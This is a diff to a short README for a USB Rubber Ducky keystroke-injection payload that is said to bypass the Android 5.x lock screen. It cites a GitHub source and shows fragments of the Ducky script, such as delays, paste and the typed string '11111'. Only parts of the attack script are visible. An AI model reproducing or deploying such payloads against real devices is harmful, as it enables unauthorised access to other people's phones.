@@ -1,5 +1,11 @@
 # I edited this because some stupid person pasted the Rick Roll payload instead of the Android 5.x Bypass Lockscreen payload :(
 
+USB Rubber ducky payload to bypass lock-screen on 5.x build (LMY48I) and below. 
+
+Source: https://github.com/aluech/Android-USB-Rubber-Duck
+
+Ducky code:
+```
 DELAY 5000
 SPACE
 DELAY 500
@@ -196,3 +202,4 @@ DELAY 1000
 CTRL V
 DELAY 500
 STRING 11111
+```
